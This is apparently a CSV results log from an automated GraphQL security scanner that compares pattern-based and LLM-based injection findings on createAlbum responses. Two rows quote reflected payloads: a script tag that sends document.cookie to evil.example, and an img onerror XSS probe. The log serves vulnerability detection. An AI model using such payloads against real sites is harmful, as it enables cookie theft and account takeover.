timestamp,node_name,response_status,simple_count,llm_count,agreement_score,consensus,common_categories,simple_unique,llm_unique,simple_vulnerable_count,simple_potential_count,simple_safe_count,llm_vulnerable_count,llm_potential_count,llm_safe_count,potential_agreement_score,potential_consensus,common_potential_categories,simple_unique_potential,llm_unique_potential,simple_results,llm_results
2025-10-06T00:53:09.705078,createAlbum_response_1,200,1,0,0.0,simple_only,,Injection Attacks,,0,1,0,0,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""SQL Injection (SQLi) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""SQL injection vulnerability detected - malicious SQL patterns found in response"", ""evidence"": ""Response status: 200, SQL patterns detected in response""}]",[]
2025-10-06T00:53:26.459967,createAlbum_response_2,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Cross-Site Scripting (XSS) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""XSS injection vulnerability detected - malicious script patterns found in response"", ""evidence"": ""Response status: 200, XSS patterns detected in response data""}]","[{""detection_name"": ""LLM: xss_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The GraphQL response returns the album title containing a raw <script> tag and JavaScript that attempts to exfiltrate document.cookie. This is clear evidence of unsanitized/unsafe user-controllable content being stored or reflected by the API. If a client (web application) injects this field value into the DOM without proper output encoding or sanitization, the script will execute in the victim's browser (stored or reflected XSS), enabling session theft, account takeover, or other malicious actions. Recommendations: ensure server-side validation and canonicalization of inputs, HTML-encode/escape values before inserting into the DOM, adopt a strict Content Security Policy, mark sensitive cookies HttpOnly/Secure, and treat GraphQL string fields as untrusted by default."", ""evidence"": ""\""title\"": \""<script>fetch('https://evil.example/steal?c='+document.cookie)</script>\"""", ""confidence"": 0.9, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""xss_injection"", ""severity"": ""HIGH"", ""confidence"": 0.9, ""evidence"": ""\""title\"": \""<script>fetch('https://evil.example/steal?c='+document.cookie)</script>\"""", ""explanation"": ""The GraphQL response returns the album title containing a raw <script> tag and JavaScript that attempts to exfiltrate document.cookie. This is clear evidence of unsanitized/unsafe user-controllable content being stored or reflected by the API. If a client (web application) injects this field value into the DOM without proper output encoding or sanitization, the script will execute in the victim's browser (stored or reflected XSS), enabling session theft, account takeover, or other malicious actions. Recommendations: ensure server-side validation and canonicalization of inputs, HTML-encode/escape values before inserting into the DOM, adopt a strict Content Security Policy, mark sensitive cookies HttpOnly/Secure, and treat GraphQL string fields as untrusted by default.""}}]"
2025-10-06T00:54:11.699169,createAlbum_response_3,200,1,0,0.0,simple_only,,Injection Attacks,,0,1,0,0,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Server-Side Request Forgery (SSRF) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""SSRF injection vulnerability detected - internal network access patterns found"", ""evidence"": ""Response status: 200, SSRF keywords detected in response""}]",[]
2025-10-06T00:54:30.323424,createAlbum_response_4,200,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-06T00:54:53.345806,createAlbum_response_5,200,1,0,0.0,simple_only,,Injection Attacks,,0,1,0,0,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Path Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""Path injection vulnerability detected - file system access patterns found"", ""evidence"": ""Response status: 200, Path injection patterns detected in response""}]",[]
2025-10-06T00:55:05.906744,createAlbum_response_6,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""HTML Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""HTML injection vulnerability detected - HTML markup found in response"", ""evidence"": ""Response status: 200, HTML patterns detected in response data""}]","[{""detection_name"": ""LLM: html_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The GraphQL response contains unescaped HTML markup in the 'title' field: an <img> tag with an onerror JavaScript handler. If this value is rendered into a web page without proper output encoding or sanitization, the onerror handler can execute arbitrary script in users' browsers (client-side XSS/HTML injection). The createAlbum mutation appears to reflect/store and return the raw HTML, indicating a stored/reflected HTML injection risk. Mitigations: validate and sanitize input server-side, escape/HTML-encode user-controlled content on output, enforce a strict Content Security Policy, and use a safe rendering context for any rich content."", ""evidence"": ""data.createAlbum.title = \""<img src=x onerror=\\\""alert('XSS-HTML')\\\"">\"""", ""confidence"": 0.9, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""html_injection"", ""severity"": ""HIGH"", ""confidence"": 0.9, ""evidence"": ""data.createAlbum.title = \""<img src=x onerror=\\\""alert('XSS-HTML')\\\"">\"""", ""explanation"": ""The GraphQL response contains unescaped HTML markup in the 'title' field: an <img> tag with an onerror JavaScript handler. If this value is rendered into a web page without proper output encoding or sanitization, the onerror handler can execute arbitrary script in users' browsers (client-side XSS/HTML injection). The createAlbum mutation appears to reflect/store and return the raw HTML, indicating a stored/reflected HTML injection risk. Mitigations: validate and sanitize input server-side, escape/HTML-encode user-controlled content on output, enforce a strict Content Security Policy, and use a safe rendering context for any rich content.""}}]"
2025-10-06T00:55:17.030338,createAlbum_response_7,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-06T00:55:25.516908,createAlbum_response_8,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-06T00:55:39.240894,createAlbum_response_9,400,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-06T00:55:52.676431,createAlbum_response_10,400,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
